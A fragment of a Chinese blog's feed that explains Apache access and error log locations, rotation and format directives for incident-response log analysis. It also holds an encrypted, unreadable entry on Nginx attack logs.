class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -lh /var/log/apache2/access.*</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210827174205366.png" alt="image-20210827174205366"></p><blockquote><p>将旧的访问日志文件名加1到文件名的末尾，最后2个最近的访问日志文件后将压缩较旧的访问日志文件，以节省空间。 默认情况下，使用gzip或gz压缩，并且压缩文件的名称类似于<code>access.log.2.gz</code> ，以表示使用gzip压缩了该文件。</p></blockquote><h3 id="zless读取压缩的访问日志文件"><a href="#zless读取压缩的访问日志文件" class="headerlink" title="zless读取压缩的访问日志文件"></a>zless读取压缩的访问日志文件</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zless /var/log/apache2/access.log.2.gz</span><br></pre></td></tr></table></figure><h3 id="zgrep搜索，过滤和Grep压缩访问日志"><a href="#zgrep搜索，过滤和Grep压缩访问日志" class="headerlink" title="zgrep搜索，过滤和Grep压缩访问日志"></a>zgrep搜索，过滤和Grep压缩访问日志</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">zgrep Mozilla /var/log/apache2/access.log.2.gz</span><br><span class="line"><span class="meta">#</span><span class="bash"> 搜索和过滤所有压缩文件</span></span><br><span class="line">zgrep Nmap /var/log/apache2/access.log.*.gz</span><br></pre></td></tr></table></figure><h2 id="Apache访问日志"><a href="#Apache访问日志" class="headerlink" title="Apache访问日志"></a>Apache访问日志</h2><h3 id="格式分类"><a href="#格式分类" class="headerlink" title="格式分类"></a>格式分类</h3><p>apache中日志记录格式主要有两种，普通型（<strong>common</strong>）和复合型（<strong>combined</strong>），安装时默认使用普通型（common）类型日志记录访问信息。</p><h3 id="配置文件位置-amp-格式"><a href="#配置文件位置-amp-格式" class="headerlink" title="配置文件位置&amp;格式"></a>配置文件位置&amp;格式</h3><p>apache2服务器的配置文件位置<code>/etc/apache2/apache2.conf</code>CentOS或RedHat<code>/etc/httpd/httpd.conf</code></p><p><strong>LogFormat</strong>指令：定义格式并为格式指定一个名字，以后我们就可以直接引用这个名字。</p><p><strong>CustomLog</strong>指令：设置日志文件，并指明日志文件所用的格式（通常通过格式的名字）。</p><h3 id="默认日志格式"><a href="#默认日志格式" class="headerlink" title="默认日志格式"></a>默认日志格式</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.77.175 - - [18/Aug/2021:03:54:21 -0400] &quot;GET /icons/openlogo-75.png HTTP/1.1&quot; 200 6040 &quot;http://192.168.88.132:8088/&quot; &quot;Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko&quot;</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210830102841285.png" alt="image-20210830102841285"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LogFormat &quot;%h %l %u %t \&quot;%r\&quot; %&gt;s %O \&quot;%&#123;Referer&#125;i\&quot; \&quot;%&#123;User-Agent&#125;i\&quot;&quot; combined</span><br></pre></td></tr></table></figure><p><code>%h</code>         客户端的IP地址</p><p><code>%l</code>         客户端身份 (输出中的连字符<code>-</code>表示请求的信息不可用)</p><p><code>%u</code>         客户端的userid(如果用户已通过身份验证)</p><p><code>%t</code>         请求到达的日期时间</p><p><code>\&quot;%r\&quot;</code>Client 端的请求行以双引号引起来，包含客户端使用方法，请求资源，使用协议。<code>%m %U%q %H</code>”将记录方法，路径，查询字符串和协议，从而得到与<code>\&quot;%r\&quot;</code>完全相同的输出</p><p><code>%&gt;s</code> 服务器发送回客户端的响应码</p><p><code>%O</code> 发送的字节(包括 Headers)不能为零    <code>mod_logio</code>模块    <a href="https://www.docs4dev.com/docs/zh/apache/2.4/reference/mod-mod_logio.html">Apache 模块 mod_logio</a></p><p><code>\&quot;%&#123;Referer&#125;i\&quot;</code>  HTTP 请求 Headers，提供客户端报告已被引用的站点</p><p><code>\&quot;%&#123;User-agent&#125;i\&quot;</code>用户代理 HTTP 请求 Headers，这是客户端浏览器报告的有关其自身的标识信息</p><p><code>%b</code>返回给客户端的对象的大小，不包括响应头。若没有内容返回给客户端该值为<code>-</code>。要记录<code>0</code>无内容，请改用<code>%B</code></p><p><code>%v</code>用于记录正在处理请求的虚拟主机的名称。然后，可以使用诸如<a href="https://www.docs4dev.com/docs/zh/apache/2.4/reference/programs-split-logfile.html">split-logfile</a>之类的程序对访问日志进行后处理，以便将其分为每个虚拟主机一个文件。</p><h2 id="Apache错误日志"><a href="#Apache错误日志" class="headerlink" title="Apache错误日志"></a>Apache错误日志</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Fri Aug 20 03:35:41.969417 2021] [mpm_prefork:notice] [pid 1835] AH00163: Apache/2.4.46 (Debian) configured -- resuming normal operations</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ErrorLogFormat &quot;[%t] [%l] [pid %P] %F: %E: [client %a] %M&quot;</span><br></pre></td></tr></table></figure><table><thead><tr><th>Format String</th><th>Description</th></tr></thead><tbody><tr><td><code>%%</code></td><td>百分号</td></tr><tr><td><code>%a</code></td><td>Client 端 IP 地址和请求的端口</td></tr><tr><td><code>%&#123;c&#125;a</code></td><td>基础对等 IP 地址和连接端口(请参阅<a href="https://www.docs4dev.com/docs/zh/apache/2.4/reference/mod-mod_remoteip.html">mod_remoteip</a>模块)</td></tr><tr><td><code>%A</code></td><td>本地 IP 地址和端口</td></tr><tr><td><code>%&#123;name&#125;e</code></td><td>请求环境变量<em>名称</em></td></tr><tr><td><code>%E</code></td><td>APR/OS 错误状态代码和字符串</td></tr><tr><td><code>%F</code></td><td>日志调用的源文件名和行号</td></tr><tr><td><code>%&#123;name&#125;i</code></td><td>请求 Headers<em>名称</em></td></tr><tr><td><code>%k</code></td><td>此连接上的保持活动请求数</td></tr><tr><td><code>%l</code></td><td>消息的日志级别</td></tr><tr><td><code>%L</code></td><td>请求的日志 ID</td></tr><tr><td><code>%&#123;c&#125;L</code></td><td>连接的日志 ID</td></tr><tr><td><code>%&#123;C&#125;L</code></td><td>连接的日志 ID(如果用于连接范围)，否则为空</td></tr><tr><td><code>%m</code></td><td>记录消息的模块的名称</td></tr><tr><td><code>%M</code></td><td>实际的日志消息</td></tr><tr><td><code>%&#123;name&#125;n</code></td><td>要求说明<em>名称</em></td></tr><tr><td><code>%P</code></td><td>当前进程的进程 ID</td></tr><tr><td><code>%T</code></td><td>当前线程的线程 ID</td></tr><tr><td><code>%&#123;g&#125;T</code></td><td>当前线程的系统唯一线程 ID(与<code>top</code>显示的 ID 相同；当前仅 Linux)</td></tr><tr><td><code>%t</code></td><td>当前时间</td></tr><tr><td><code>%&#123;u&#125;t</code></td><td>当前时间，包括微秒</td></tr><tr><td><code>%&#123;cu&#125;t</code></td><td>紧凑型 ISO 8601 格式的当前时间，包括微秒</td></tr><tr><td><code>%v</code></td><td>当前服务器的规范<a href="https://www.docs4dev.com/docs/zh/apache/2.4/reference/mod-core.html#servername">ServerName</a>。</td></tr><tr><td><code>%V</code></td><td>根据<a href="https://www.docs4dev.com/docs/zh/apache/2.4/reference/mod-core.html#usecanonicalname">UseCanonicalName</a>设置为请求提供服务的服务器的服务器名称。</td></tr><tr><td><code>\</code>(反斜杠空格)</td><td>非场定界空间</td></tr><tr><td><code>%</code>(空间百分比)</td><td>字段定界符(无输出)</td></tr></tbody></table><p><a href="https://www.docs4dev.com/docs/zh/apache/2.4/reference/mod-core.html#errorlog">errorlog</a></p><p><a href="https://www.docs4dev.com/docs/zh/apache/2.4/reference/logs.html">Apache中文文档_logs</a></p>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日志分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>分析Nginx攻击日志</title>
      <link href="/p/9cf51d2.html"/>
      <url>/p/9cf51d2.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="1990ba97be66b719c6eca6936bf5244bb6dfaf6b55526639eaaef9f9b84c6c12">c157c9744e0298d00173c08a9dbffe0ed073a56f7e3a628a68d0b68815ec97a60948d34d0e9e0cecf2663ef80327e345ee080792b8174bf2d0a1c80e258292360390d53fbe3835981c5080bfe7ded2745dae7aa50faff240c23d46d86786cbf9dcf085f41756c289ec2207e03224398515c75f6bbb17d014cca0d9c4def607a457ff3bfad6c9b92fede2992acbf1f2fae92e78f1a6955f4657b120f0ee2a07451be73512cc3711a2ab0bb639900ed5514841ecce99de5bd1cd1ed484b9d017c5fe40503f8a2431a3a0956b5a77d8dfe72d625850fe1b0962b839f8761ad0a082bfb4242e48bf20300c53391b29ea8cc05f314b42ade6905a0742b4405ea18e7ebd6246c4cc9577a80207329cd5a32210be2fb2852753734239fd6d462a2695a3fe9818375cc9cae36817eb5d01ede57a2d2f9e86461125e0c1a9a6560b3d1442bf765001940ebe8bd7620ff4cf582fb70f576e0b461f0b3d5ce38d0d5ad91dfb0ffed7891e4996c1a19a647ffd06ae9a0d6e566ed46e85903e5e2f1478b5063341dae559f531ad6c06a72fce32736b8bdbd1afbb091e9da0f1c7317f1f32f3072508feaff9650ac64852d6e0b1b4973689d76c1888ce777b47f3ca6ce41c1b13b84a6e307f2945f71001cfc35e3169de44fea454ab2efcb9cdaeaa8d6b25b528fe2cad2d95603f1e9b5abb07b40248fcd8a16ec2ba4ff360c12ac57f37f9e02cd05a0d35e3b2733391036dfca183b3c2295cecd0266afcaee914f967802e646f75e3316c68a7265d16a892e82e3ef5635c7ac88b9c8b983367f248098ee0e238562b186a643da93364e6cea0ed55217a1795018f8f7caf433f071303e3ced6e2de45d0f300290d71fd330ef96c2402b3177df3c54345798128777709fbadd206b37f66988e400d18a80d506732fb67b006607a0e2ea2ebf7307c0ddc958737fb868aa10765ac1b5c5aa7479dd8d74369808e6f0907ed72a9fe2bd89e2f900bba9ad03da0cd7c780786f8394ef631e4abf68f0560533ba4735f7ca581fb7283d7b8168ed55c5be1cc33be9cbeccfad5d94c265a5612b22a1aceef296088cd382ef7ef2cda407d8bea8b4860d11ebfdea2001ecd8896c6da32a963c98cb4baeb77f8dbd07c45918a3509d2906731b888d0ca5ff53d0fbf37c364f473eae8830de2254348e04af9701e92d4e000bc4c8ca811ea688d9d701d3887bd350c5311377626cf56dff0ad7d5b90596a18e25b7f9c822729e4ade10228148347ed6e0b446d9ab9c407b9da69bae42f04d430a403fd343e02ed77a7a27516b3a85a32dc2bd0ce607c44a3e760376a1d7f8bdb7b60ef7a12cd275386d0f26a24b445da700d5280212aae1cec29dab6af3d5cf8c203f22810f82e827089bb6cf90dc44b7e7fdca537718674b2be85cbdab0db88d29ce4f9c65c86ba5d79dc00bbe1fc4bb07ccbdc496eb11d05f880e99f3dbf0d5d22f521fbfccb4b916ff376dc930b91020cb4cb55722c6412de9d7defe68bf0bbaca56ff0fd32bf51ff34db36d8da87c5621ccb98466b337b640b47ab92b051d6209a798c5b9b773d0dc2238af47a60a91ab8895775921da6d4897e26b4d14c1b62c65bc4f4ad30979a3568c20595ea7ec1777f6f17742d9af88168183a2c6d1c972b5264b1b0ce21af81a9b7344cfe670450c4ce91a93feff27d8ad8e14c1cac65559891c3aea9bebe6690f9712fda6985b30d8b283a49c6219fe1b40931c2510c0fe1d83ac03665e5a45744f0e7bc4bdb333cbceef03037bbb11abdf1be5e943b71b1c333898bb0d66d96852177c374e3a53c3412304df8e6c58c0be4dfa9200c1c08fab1b5b211a754af5df826998b44afc49e3e1e377f7b06d39c628ae589813082fce32d9937a876e875974d2ef1442c213e52b2aa520502c269a77bb7f51dca748fe7ebaf3b8e47df9fa71b943f237a579d08b8a9c74f8f862b7d4c1753999b4eadb789ce9457387e92eefbfb7c3649582dd9d5a1c856d3807de6839f1a9f93190054abddb8fa078c713334f1c0dfb484b603d27f57fabb8ce90774bbdbba831066966f7454cc1d337bb502fb8190f45707373419bbe0379df14894a122ae3de2303e2317a9fcf10a03a24ef036e428e9647d561df72216a552b045c515fc2b55b7ee25c24e1baa981066ace9374265fbeeebbf94a8eddb5bd9b582dc747e4664b189d3b7b2bc3c4dc6143aeb2f95c324a71d372525f63bc14d2ad8cc2d944baef4aa9becc570797946a044ec1e2d9c3fe60efc8d46ef62aaa6fc0f5d164a7a11f801d5cbefba9d74c4d005aa7a497021cb7ae09226ad8432f7dddf421db9252853a6aeb4ff5ba0bf34bf5e31850b8ee5ad543723aa4cacabca26b1823bcf9ce94ef7cd438dee1072e338bd3174527d86b228690943db961899ba9704394d371993e03e73745a8aa99b7ab1f5c5021603f14968c3301a72282b740c25dc74e6b5b96bd1bb9479804142018e6499ae74e9fb7e4ec73b310e909572208eed5742c2645758a57847eb0a2f683e3bbaf50d291af79539dbd3e4ca33ce0338af4589802c71c249fb6df4503bc0c073f8d7c3ff1274c0a45f3165c0263aff791783d8099a6b8bca27122b8e24cedea3c1c20a7def333aa6c9920f5bc802f8e653198bc7617178903baeea5c60c320ba895a98841065a10b5349836fc452aaeda7638d11f3035c86b21eb88da5293a8c62da9006e362557d4b893704b04aef48b0b00fc74ea8b579043f0b4eb056c4df8fcc47723e4a09c9f81c4e9081340d2dc452f41a9ec7cb823147c6f6fa4323c2c7ad3c289e65be4ea4fffc0a214a55c604e7ce47c6ed3d43ad3df1f38a16d18cb59f4790c0ed81d14cb0c7c409d3088a0760e6bb87891667f355703065336bb0fb00718adf1fdd19304ee2c24cff1418145bacf9a5ff055b795fb2586f33215d7c2ce57edac95de28886e7b16968bca4d805ee050ecab85e634063c53588029b54f48b76045054093897b7b793ff22f0fb2bb3e59db919ee244607bd392c01a7527e3b7bca5c6af3b7042f4ce8db0c57dd5847baed11775760b7c3a05c7588a8c5c8eb5d43f145a06050eb574c265bf4dd54b918da28b7df737f58bd2bb5b87acfc757620d35e06bb06dc940478155214d570b3cdd5326866a95a24da9b04e0a29d24aa2d5320db3a520030b96540456c1f8e9267966a738072c38bf0bc37efd4288de16b1881c38d0e3dd83776d854a9299ed09561bc0216d5fccf6340eb9ecc69863d370dc55893658fd5bf5c6a6e79699509fb192874ffe9dc17d85d063085e81694409d2651a09300f1690c5ae8bda28407d5c23ee11e6c4a3fe077e5a2a8decfc3347c0d81f7f378c549b48d48d3bf74608620f04fe3aa268e63837b972e239522a1b07571539f0e079e3978350b2f191136129ba52414f302972f05afa734252afc2b64f2bd48b9e825aeacd6d1eab6b302201e8a448a0d016b6ddb309e4e7634105198b32f322cf7c97fba887d6184a7145d82a2158865a25d4dda08d193f4800e05ee910689972fe5b9a53987f61203a84eab6c166efe56b19f891e7188dc8d6c90b221899a6fc206ed9606ae0bc8eb47545d020db243e1027503d7e1eb567d86112af14e9cf710c285c7d04e14dcddc8e34681098782d915508192161b27bd0cfce760b3bcad28e9610d4801584e267e33e033333c3259654919bed8e2cea3461795b6053fc0bf75d5ca016f725ca18ef1b017df3755b48ab5811a2238b2a5a08e2a1961649a6396466e316094f169d596e68c519fdc1af80b0dfeb3718ef147f7384b23ce069cecc8950088d05dea995dca34ed2d83410b1793241f4a962eddd2770f81413b5b41037c47ef38acc184c6eaa62e0d20973f62b9b7c7fcaa82ddd149455836578bcff93fc497aa38fb40be1a406c088f1710b6b8630b6a2a7b0f2bcd9a05b12788b8a08e143eef0044dc0eb7ea6fc573d0eacdc0e54d69626773579f6c1bc53df85a9e8862e4c721dee6e4a3a114e02b4cd5ac05508ee022308938541129828eef6fb5f17b5826bd776350932e91faa78efce9431efb15caa5794e19feb6f48e06dc4184af412e72b85f36eaf63551d029a18c4134bbf366649a27b6570a59fbc1d046cedec903e39ebb20363a8cc490c665c93c8bee1a36cb1699c8660d32eacc73dd35829ace4831f34482835172e48443131600086fa8517fe8fab056f2a2463f17d6278883d7d854f2d30f47505b52ffcab850c3590c995a973ba4377642ab9695c83eceb45c0b36040e2a98023683d9d14eef97d2f0cc22116e5095b2c7d31b889ea4ef22e8f7cf973b7b2f13c976810e3d54a339dbb6401f46f86b78e8f6db99905f170be77890587b7712075b9a0051f3580e6a52b0a5bbffb19b9f028781c9e0e641d70bee88525b190428053e4c22a2ef637a7c46fdcfea631a9d834ee3383625c0f31c0d8180198a17387e41a4bff9d2bdcf790d6d037f7797076f9c09c91cd99e7add037dd8d7b790936be10ad1a2ecc8a5d8e9059513343c5b9732b6b1bb02726716710a3ea23e94c7c1d8c76fd4c0b2b5b56680d98ff0df9e1462f7210e8776f69a3a72536f0ded5a871e326b080b1e2a3944662a0dd0622691844c586c48aa4a65ee138957b7ef357900a8abd6fa07e8d9ea4a07a7b203fba75fe91717b6101e0f64c3c549e3aa6ef314e809a349c8a1ad0df1f509ccb7ae5ac768497f03f1851bf62943c45b6f785ffc7c544e0d47b69811c0772e937d9712901a14b9c021ee592a22fac06d0113bd5ef2f25419b2ac1bf38865284a61163010907d504e5dfc75a358f8b56ab69a1c9c87b9016c9585e5c5c17e3202bf791d8d6762d7916a20fe12d43fb0ba9a53b31d32d70a65cef8af91b91ef038e07073e13fec96e3810da98b63a422b8a0a437563a6919fdf5dbae09e48edbab6d41cac6d34f912fbdaa0e9bc6ede24d183c69466244268f908d5bc5bd794b34437bda4fcdbc2c5f910f08eccd8710dbb91eba744c607bc072c201df3a7a07f50cae541086ba68c3cc80f79b6942e1ac43e8f913462962f383628a9ee8fa3736489bab86129f8083df5bc6f5e7afc901595d880217243d7063536fa8547842d9978ec7b90fc24e574d117c2f137f2ee790beb6c32f1ac51c12da1e7f0ceae71943cc358a2eddb9aa3ee119d08feb1ae954bf36104609932bc655e93dc96e6f1b6abc0923485c5ba60b52411b28e6fef12a39bec40af549b6215623af4b60a5f35a56737d29e0bd64f999f28c616e94b613853dea00022238cfeb0d6131737a15eda232a93939589543aee9145c1c6cee6f1574ccdefde03a7550d9601ff05e12d0a0909baf59ff4ae460507ca390711a5a6293f7ad8805c49cf1ff75365194913512aef7f2d8677a9745ef22fcda24008bdc772df773dd8050049baacaa3630a0a5278e800bc1116428196004a78f5c8be29313dc2105f0f96ddcb13899c347c958808b9bc62d42c6dc27f720fb12e9063472545ef3dc01db7020b0db5ff1e92d8c9dc690ac36a083c281896088aa905905b1a3180babf6eefbb4111314f4edc23c843455f7f4cb48b35fca72e344af4ca90f4dacbe223622208aed692c9b0f2f63d08a633f52d78056a7ec101fa7065f5d3d906af0fbe77de9ea80ff20b16383a006546d57bb29be71a18c8d320cb089f5c7838dbbace3908038eb202f1b331249cb4550b222f53e17b08fb9626a9dcde9abc04924f3390c1540c5f0cdab111a80a847bebfea4451e53c5cb53cb6c131108be7466188cfa67f7011375fbbcfd59adfa67c82af1398b7e1f4324a6caa4ee41970b09ee8fff9aa523ea26e00cae8b8eb35d3896b35fe41de14ba0b72fa1206bd62e044c2366b07ae5015220e06f1f68d90c6fccb0b3c50cf12e5ff528b311964714452baaf6087e1fe9531d96c0f9b344966f9369dcabed2abb848134f3762532a0d3d730b274ed9f28e7ae806a3f50ee923821293e8472665e555abd52e7fa91b709a1a4cfb33e5e94b37f5e3e7dca954003b3aefdc83620e96c7fe7bba06ffcbfec9382b9389ec3a3d5faed1c5952e86d08f78878669c8dfd5d29b34c0f5a696c8cb5cddf4534c085f08f45947896bfe83cadacaa86663cc18dad62eee691f38bde4d5a8630e76d3d0df5459e3abd5b8caa665ac2f67e1373019b8fe3a537a4d4d245c9259b73c3760eb7e2f57a608d983910747c4eccf4f1ffd8ee457325be9f0d30428144225d33242ac80256af5005f36dee4cab546d3a6d9942f4ffef4c9028a364d5437b116b097c02f4d2e238ba1eab675ead5af3e85558787efed220268392819f144f2c57603ce220843da95432ef2acdf3cf4a8b74389c3cb1bc73c9d398a5fd918b2c8bc45cd4d70ac20722b7666a95010e16752736b32f01bf74cc4b7c0eff3927f6022655f82cd9c12116f16448007531073890583da4896d169e0c5422b4ffc4bd36741f683f98cf92a86b4b95262f2ebb532fbdaa8d727b2a62e75518f05fbfa55bd679fcea6fb6fdf96cbbe4e81de6a69ffbbd10b6cef4e8c5b72ce1fac6b33dd8c77d03ba2e028eeb0cc2730c733e90364ac48bb26f1ee9504bd86d58f838d5d984ded36b5cf6bcb4c832aaad91fc4c98c552a00b62a44297617bf66c6763a3f79b28cfa8739ed4ee6f7f592342f718564151396bc6986b29f75540f5224a38ad3d6de6c52941bf6c5ee8abf8d1766e8f6a744335f886ed989987eb40edc5431d7c1749bd7d2ec03a09681c8bdc147534a3f485d4c2f5e8bfcc11b6e778a1cf9dab21abdb697e2f6720d263599220f6ca98bb328fb110d4872cbf746479b8b6485b1006817f956caf2d4222d21d4c1dd62ac91aca0b1df1f2687f154af8c828662947d41ed772340541e2f3456848def09d5267bf200b81feb98576a48130b4453228e4051de0aecebe0e435fb46a5ee47df23b0e5b61e56b84cfb0d01f8577a60ecc305cd048974ef0de370a73456ae78c2c57a06e4a87b3b33fd04becfd29d54c7bc4c8013411843900adb65d6c3539c1c9ff2d498a242de8b618cce316267d2fea3b6f8a430e05dcfa829cd70094d5a5fab6852adaddb396c99d366860b4a441d7218db78dba1741d24f59a80127dc4de41d034f659eacd965b7d8482ee0b2f2306f98c9d7e32bde33bdb3084589e832a5e2474a8fd3688217d50c14996c22c78534af27d265d62b3f856f31af07c31e3d6038d6ace19fa0fa1c830653a8289966630e4e98ae5718eca194f9bb77834c9246c1433fc6cd79409a93e5bb91cea655a6683776b3ada41546d8388875c3496c4d6e5f5f322ae218a6585f1c22be5d6d03eb40437046f044f785a7a2f7ec428c0a645eea2f64629b5eb8533108258cc3fc3c36c33026557b7ba58630b93394797280a5766f65e14d8ffca0ffaebdd50a984a6c8b09a6e62beaebda573021ea62d470b84862ef23c7d9431a4e26b3a8610b04b0c6de659cfc89c2412142aeb1ef094b7424dd9540d455131b848e3b760676efdeefebd0cdfce55547ecfede3d5a02258d4e6eba0e235ab119fa442115567c45942d44023fdb7bb1028e6a20e8c82e086718de173523675018c74eebf03dbf8c1dbd3f2fbe99f136e3e6a5266eef1df6ac99b132d278151733991f901e25400273bd88d4dd2e4d9875d4a7a485ba350c1f304e77b30e3f97ae614e0ac2a782d3668acbf829f9512b74b96fc329e55c41b721718a219c6eee48453ec122cd77bee0679a5f1cafd982ce99457aa2103716f6f10542937068d8c69934ca5c1a8aa11f297f1b7b6ae38ec3492a99bb7c233034076abd2925c6c956560add42315b4f0d0b3005a5f6b6554c81cf2bf7433b7ce3af29c3f6f24cb0065c3ed4b7e137c7c89655dcf530405c23e0260b211665fa8ef60f96aacdea2b1a31413f300fd5115e5d0979e0c43b072c80f5fb41c090b3e598e3033ffd03f7dd1826922df6039c5b122e92a5fde4c5bea0b2fe15726521dd3aceba2091378570ed3cb050b83cb6a199b1f52d7f9ef482da52d7415a3968b7f5616c11ce2aa3b4d4e12535d6e584c8247a594737a9c7bfd02a02c38463969e5972d9d2875a8dca2a80fe22beb7f33395f84da8d8553025f1557de87f8f86a8bfbda398cd07159ea7acc45b18704bbe836137c4a055f7d80487fe00bb7cee78da195924ed4bf08116e2c59f3754c4a5ea1a6c335edc7fba7547f8f6570364110d57bbafa2e00780efd20f7e4701c3e20a1bf3ec7f321ba817d0a54f092ee1a49694bd7527365cb9c315f9657a72f45d5a3dde6ed3b40d35063485083d16669f833c14648a36fef6469f40130b433bcdf1e15b34dc3cbe69ceb24149c0eb8b9c5606d8d2ec7e9f1792257814eda11d675110379f79bbabf5e369a272961b8a5d61d0b38bd17ece6e22815612b0f995fea68b66707030cb5c4c01f6cd134e04323fbf42f2cc2e9a5eb94c9305f9cbc4a767f22ca9ab780cb4f3ad3dceae7f0858f4b94f990eb14d5498580ad933c5e00d8307fe2f7a8c77b966cb8a91bb4ccbd9d9cd8be8ed604f947089d935127695af45745ebfb5bf9669aed26a9c5377c939a22cc185aaded5e6e0321a82fae431e7bc28e6e12fea166c8861a47ae2341a7783ab80f4bcadfc2baaba9658b67a62ec9366fe89b1f66f096ac1ce3a40a6ebf86bce2e086a0aa139e9244a66b3c9bb087cffdfb76a502e21a71eb87ee95cdb7a981319c9164d91d995b5732b2411d2e88e7fd6104d1d867656e24981c03962f7804b7caf0c1205eb5d1dd67bb8751998b0721267d11c4fed1d985f740d4a4ef8cf0ea6824c6ed60efef748597296b7756e1e7980db368555e188ee8f9958e93d6081c4cb62aeefa80d922a96bf3ac65bd88d342fbaca7ec8a06a365b1733e0d622a177d6c6c73cb53723f7d5c2a2e34bfa437a9d7d30be431c6646760d4db22ed364c01e1d208dea08efbf90637e69b85b50813fdfe0eccc3991daa42a4e839c2942a6f7044ee36347dd1adeab2aab03f65717b7da0b2a7ff831015a0b0f08bc5a4be4c98ea790e669ebd5f46cdd7f683286d93c9fce387b35aa2551f07e8253629b3c269073cb26b8ec70da7b0affd35f896cf0c1d665ef54c062ab942e5f774749bf3edac8656de9ebd48854b4e70bb9ac03c6bda7832403a25efb56d61b7a7c37a2d2ebde406d55f68e35c8fe5a39def19a5962731eba2bae4e1ce1c78abf4b93f3a9e200ef95fcdbd065dfa44468db751d73567fbeef0f1712f53be9cf3dbdeac9aee7a93f72c670f44250358cbc0dab50ac68fa2546036ee2ab44f835ce5d4012582979087eef32c2d7127ce3f7aaf344a770e2aeb9ee5d1a55fd80e5f0d365df87f397b561852d4fbaa04ce8c95533c05be493da75f44d5874a42a41d42345ff28f580d8f47fae86913fc7e64a1c9cbc848fef405b15202e9c38f56ef1200540136d8dbdef798794a6e58e28a91de12a382f9c5cf7d13133241f55d0183e72b0ae8ae8b77a0930d393ac842c31570f77f9225d5f7cfc6f3c09767f0492b727f6794a0718067739dba1f6712c7f41c7e08ad4173643fd2de9308dc4b03c5eacc415f6cec270710c093334dd5887ad685706facd3c64356393cc05d2769dd4f104646f4efeb6cb24e69830993e58524582de03eebe15beac18ac5b0c01013267d346282034a2811a8ff70b2d1d235e26d5246a8e8a5aa1ba5f3e9ac3599e1afa95c4a8a4ab6b618ebcbad2f87364bb34d7b3bc1f19d78c84f5bc1079b8096e908e9d57d691d2a90d33ddfc01f39fcf7aa0c904b3ed1ffd951ebecdcaf0bdc22b60c5258ac532e8ece45ff7a3e9e65e792e7d840f906127e5b1178e79d4ef9c408fb065492fe90fd5307d440696dbcc45cf7f4f61edf2d1cd9952cfcffbe6acad3bc424c976fc8e8a7763d28cc1c22d682112313811da1d94aa2f83260b2e38b75a4cfd1f7166669145c1e36cb38da36d10d2db8c7f7b18692f2636f0bd25b422c94e4a882136e011033dbd13679ded3254b52e497d99bdbf4ece465f55effe5c093a3208ad3a6a1f3258df32480127fcef104c87e32b267c2b2d2edb898a8eed4323bbbcf56740e05c2045567036729f80ade3969e8b040df097e0275e00714fcbf911e49d5ddb1b875b26ce7f4acb82ec34f71f13c73587ec783fd01b3f12324047b06d7498f59c5e1e6b6868c855f76a43959226c504ba6f1494b4203a6fc26ce4c9017030b44682120f3b3bf5479ed84a42e512f5e57733babf927b365e03057f5f729cce16b49c47be6ef483671338a0b7b20b5827979b9e07f346aac0990d58a417b3a08371fc0b045b5c4bc3a5af621c79d12f1aa965685cf2c9b23f12fa4e6b344261d6287e6a5f9781667fd38c988198252e9a4d771cbc1514f0617c096b90fe8f31322aa20e032236b04181c9e77caccc2c6284714e4969a296de5ae947e2444685d9e4918828eec8465ffdf0174040361f4e1ff972a91c1c24e235819d7a9708a8982303fb7cf42028d7b9c79e92d3225eece67040b128f81c0236837b03028c7808ccffc4f699059564ab70b352d11125e5ae7911a94786ead3accabeb4f2d8fe7e491e352027306853b49f0d2786faa1b0b3a8766f3b7491da72a198af43029a8975119051c34e7273b5bf80a255cb977b6b8f9a4a3da8ecdcdafb0b020a4b57642bfa1a87fc43ab8a5145757b7dcf10dd65fe9c3554115875a8635a7442e51600b8e0bf94b739495f9fd19e71d0a2f085eefe26e07ab1f52840ef2edbf710bff47be6f2e311e9384b6f411543bf736902da2708138b33cabfffebe85a35e49e4503871702c3443be1f264079a95ab4188e75ede44bb93ec8cd004eaa868af949568664a55b0081d25cd7588045524b92addfdd865a54ecfe26f95fc64d7206815f36c9865eba2d393050c337f45e042266ade52a97af419e7d7951334885e7ec06a903fec173a200d507ec715b83c3bfb1f3d6cd2580eae453b01441d49d9a8fdde81fdfcef66fa4488863612a1c5b322a7404a09aa075c1d9e5f771925f42d7824560a7fa89427a39b686b213c846062e2ead88986b706091c37afea10fa03474d6e834c1bebf32af6ede9e655af935b709f20e1c3e127f9efb7dd3ab894bee463fcb05b505c5957efecf1501966e111f19e405a5365f0a68770654a235f25dddd00b9575f3330e629f2d67fd8de8d2a0eb735df15451785f903a0eb829c176a71b8aca84c7bb6f9abd1706fbc6aeb51ef33b1e1fa2a261fc064551e79fe025759d04128bdf177f41f765be6a5ab3440a7c844493d11f6dbd428426acfb30af797d51f915738c7687cb7844c3b70b9d12278b42f3153297ac61cba2479fe61790e224918ce9aa245be64799a0b57d56f8016b894410d67542c0568ee5ea0b8db8b68e7fb0724ab1a438c95215be6e2fda96af93cf92388b58063d2ca7fdbc3a3c9fe1a98e693897376cc5ffeff84b4d02989406c61b3f81bdfdd46225f2b6b4f0dc16461fca464da268b43bd5d7891cc7fb298558ff176b1216511df7cf27cc5fa8e4a2b4c8d22e5